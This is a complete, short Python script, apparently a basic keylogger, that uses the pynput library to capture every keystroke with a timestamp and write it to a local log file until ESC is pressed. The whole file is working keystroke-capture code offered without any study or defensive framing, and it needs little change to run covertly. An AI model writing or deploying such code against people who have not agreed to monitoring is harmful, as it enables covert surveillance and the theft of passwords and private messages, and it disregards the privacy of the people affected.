from pynput import keyboard
from datetime import datetime

LOG_FILE = "logs/keylog.txt"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        content = key.char
    except AttributeError:
        content = "[" + str(key) + "]"
    with open(LOG_FILE, "a") as f:
        f.write(timestamp + " - " + content + "\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
